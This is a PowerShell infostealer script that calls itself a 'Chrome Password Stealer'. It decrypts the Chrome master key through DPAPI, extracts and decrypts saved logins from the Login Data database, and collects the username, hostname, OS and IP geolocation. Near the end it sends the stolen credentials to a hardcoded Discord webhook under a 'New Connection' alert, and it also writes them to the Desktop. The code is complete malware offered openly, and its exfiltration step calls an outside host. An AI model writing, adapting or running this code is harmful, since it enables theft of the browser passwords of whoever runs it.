# Chrome Password Stealer with Detailed Logging

$logFile = "$env:USERPROFILE\Desktop\extract_log.txt"
$ErrorActionPreference = "Continue"

function Log {
    param($msg)
    $time = Get-Date -Format "HH:mm:ss"
    $line = "[$time] $msg"
    Add-Content $logFile $line
    Write-Host $line
}

"=== Password Extraction Started ===" | Out-File $logFile
Log "Script started"

try {
    Add-Type -AssemblyName System.Security
    Log "Loaded System.Security"
    
    # Get Chrome key
    Log "Getting Chrome encryption key..."
    $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
    
    if (-not (Test-Path $localStatePath)) {
        Log "ERROR: Chrome Local State not found at: $localStatePath"
        Log "Chrome might not be installed"
        Read-Host "Press Enter to exit"
        exit
    }
    
    Log "Local State found"
    
    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKeyB64 = $localState.os_crypt.encrypted_key
    
    if (-not $encryptedKeyB64) {
        Log "ERROR: No encrypted_key in Local State"
        Read-Host "Press Enter to exit"
        exit
    }
    
    Log "Encrypted key found in Local State"
    
    $encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
    Log "Key decoded from base64, length: $($encryptedKey.Length)"
    
    # Remove DPAPI prefix
    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
    Log "Removed DPAPI prefix, new length: $($encryptedKey.Length)"
    
    # Decrypt with DPAPI
    $key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
    Log "Master key decrypted! Length: $($key.Length)"
    
    # Copy database
    Log "Locating Login Data database..."
    $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    
    if (-not (Test-Path $dbPath)) {
        Log "ERROR: Login Data not found at: $dbPath"
        Read-Host "Press Enter to exit"
        exit
    }
    
    Log "Login Data found, size: $((Get-Item $dbPath).Length) bytes"
    
    $tempDB = "$env:TEMP\chrome_$(Get-Random).db"
    
    try {
        Copy-Item $dbPath $tempDB -Force
        Log "Database copied to: $tempDB"
    } catch {
        Log "ERROR: Could not copy database - Chrome might be running!"
        Log "Exception: $($_.Exception.Message)"
        Read-Host "Press Enter to exit"
        exit
    }
    
    # Try to load SQLite
    Log "Attempting to load SQLite..."
    
    $sqliteLoaded = $false
    
    # Method 1: Try PSSQLite module
    try {
        Log "Trying PSSQLite module..."
        if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
            Log "PSSQLite not found, installing..."
            Install-Module PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck
        }
        Import-Module PSSQLite -ErrorAction Stop
        Log "PSSQLite loaded successfully!"
        $sqliteLoaded = $true
    } catch {
        Log "PSSQLite failed: $($_.Exception.Message)"
    }
    
    if (-not $sqliteLoaded) {
        Log "ERROR: Could not load SQLite. Install PSSQLite module manually:"
        Log "Run: Install-Module PSSQLite -Scope CurrentUser"
        Read-Host "Press Enter to exit"
        exit
    }
    
    # Query database
    Log "Querying database for passwords..."
    
    $query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 50"
    
    try {
        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query
        Log "Query returned $($results.Count) rows"
    } catch {
        Log "ERROR: Query failed: $($_.Exception.Message)"
        Remove-Item $tempDB -Force
        Read-Host "Press Enter to exit"
        exit
    }
    
    # Decrypt passwords
    Log "Decrypting passwords..."
    $passwords = @()
    
    $entryNum = 0
    foreach ($row in $results) {
        $entryNum++
        
        try {
            $url = $row.origin_url
            $username = $row.username_value
            
            # Handle byte array from SQLite - it might come as different types
            $encPass = $null
            if ($row.password_value -is [byte[]]) {
                $encPass = $row.password_value
            } elseif ($row.password_value -is [System.Data.Linq.Binary]) {
                $encPass = $row.password_value.ToArray()
            } else {
                # Try to convert to byte array
                $encPass = [byte[]]$row.password_value
            }
            
            if (-not $encPass -or $encPass.Length -eq 0) {
                Log "Entry #$entryNum - Empty password data, skipping"
                continue
            }
            
            # Log first few bytes
            $firstBytes = "$($encPass[0]),$($encPass[1]),$($encPass[2])"
            Log "Entry #$entryNum ($url)"
            Log "  First bytes: $firstBytes, Length: $($encPass.Length)"
            
            $password = $null
            
            # Check version byte
            if ($encPass[0] -eq 118) {
                # AES-GCM (v10, v11, etc.)
                Log "  Detected AES-GCM encryption"
                
                try {
                    $nonce = $encPass[3..14]
                    $ciphertext = $encPass[15..($encPass.Length - 17)]
                    $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
                    
                    $aes = [Security.Cryptography.AesGcm]::new($key)
                    $plaintext = New-Object byte[] $ciphertext.Length
                    
                    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                    
                    $password = [Text.Encoding]::UTF8.GetString($plaintext)
                    Log "  SUCCESS!"
                } catch {
                    Log "  AES-GCM failed: $($_.Exception.Message)"
                }
            } else {
                # Old DPAPI
                Log "  Detected DPAPI encryption (byte: $($encPass[0]))"
                try {
                    $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
                    $password = [Text.Encoding]::UTF8.GetString($decrypted)
                    Log "  SUCCESS!"
                } catch {
                    Log "  DPAPI failed: $($_.Exception.Message)"
                }
            }
            
            if ($password -and ($username -or $password)) {
                $passwords += @{
                    URL = $url
                    User = $username
                    Pass = $password
                }
            }
        } catch {
            Log "Entry #$entryNum processing error: $($_.Exception.Message)"
        }
    }
    
    Log "Successfully decrypted $($passwords.Count) passwords!"
    
    Remove-Item $tempDB -Force
    
    # Get system info
    Log "Getting system info..."
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $country = $ipInfo.country
        $city = $ipInfo.city
        Log "IP: $ip, Location: $city, $country"
    } catch {
        $ip = "Unknown"
        $country = "Unknown"
        $city = "Unknown"
    }
    
    # Format for Discord
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.URL)**`nUser: ``$($p.User)```nPass: ``$($p.Pass)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    if (-not $passText) {
        $passText = "`nNo passwords found"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:desktop: $os
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords ($($passwords.Count)):**$passText
"@
    
    # Send to Discord
    Log "Sending to Discord..."
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
        Log "SUCCESS! Sent to Discord"
    } catch {
        Log "ERROR: Discord send failed: $($_.Exception.Message)"
    }
    
    # Save locally
    $outFile = "$env:USERPROFILE\Desktop\passwords.txt"
    $passwords | Format-List | Out-File $outFile
    Log "Saved to: $outFile"
    
    Log "=== EXTRACTION COMPLETE ==="
    
} catch {
    Log "FATAL ERROR: $($_.Exception.Message)"
    Log "Stack Trace: $($_.ScriptStackTrace)"
}

Write-Host "`n=== Check log file on Desktop: extract_log.txt ===" -ForegroundColor Cyan
Read-Host "Press Enter to close"
